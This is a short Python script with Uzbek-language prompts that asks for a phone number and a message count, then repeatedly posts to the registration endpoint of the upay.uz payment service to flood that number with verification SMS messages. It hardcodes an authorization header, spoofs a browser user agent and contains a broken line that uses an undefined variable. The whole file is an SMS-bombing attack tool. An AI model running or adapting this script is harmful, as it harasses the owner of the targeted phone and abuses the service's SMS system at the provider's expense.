import requests

url = 'https://capi.upay.uz/rest/ar/prepare_register_user'
headers = {
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-platform': '"Android"',
    'accept-language': 'ru',
    'sec-ch-ua-mobile': '?1',
    'authorization': 'Basic Y2FiaW5ldDpDZGU3NTYjQCFQbE0=',
    'user-agent': 'Tor Browser/1.0 (Linux; ubuntu 22.04 TLS; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json; charset=UTF-8',
    'accept': 'application/json',
    'version': '1.5.5m',
    'origin': 'https://my.upay.uz',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://my.upay.uz/',
    'accept-encoding': 'gzip, deflate, br, zstd',
}

phone_number = input("Raqamni kiriting (masalan: 901234567): ")
sms_count = int(input("Nechta SMS yuborasiz: "))

data = {
    "phone": phone_number,
    "password": "@CyberKnightuz ",
    "retryPassword": "@CyberKnightuz "
}


for _ in range(sms_count):
    data['code'] = verification_code
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        print("SMS Yuborildi!")
    else:
        print("Xatolik! SMS yuborilmadi!")
